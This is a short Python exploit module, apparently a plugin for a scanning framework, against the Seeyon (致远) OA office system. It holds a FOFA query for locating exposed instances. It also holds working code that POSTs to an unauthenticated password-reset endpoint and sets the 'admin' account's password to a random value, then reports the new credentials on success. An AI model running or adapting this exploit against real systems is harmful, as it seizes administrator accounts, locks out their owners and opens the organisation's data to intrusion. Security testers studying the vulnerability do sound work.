#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/Ox2HKEgQjKourUH48_vAXg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '致远OA 前台任意用户密码修改',#需要真实存在的用户

      'level'     :   'critical',

      'FOFA'      :   'title="致远 OA",title="致远 A8+ OA"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  # r0 = randomLowercase(6)
  r1 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      'Accept-Encoding': 'gzip',
      }
  target = '/seeyon/rest/phoneLogin/phoneCode/resetPassword'
  data = '{'+f'"loginName":"admin","password":"{r1}'+'"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    # print(res.text)
    # if re.search(r'code.*?message.*?密码强度太弱',res.text,re.S):
    if 'code' in res.text and 'message' in res.text and 'sucess' in res.text:
      ret['huixian'] = f'账号：admin,密码：{r1}'
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret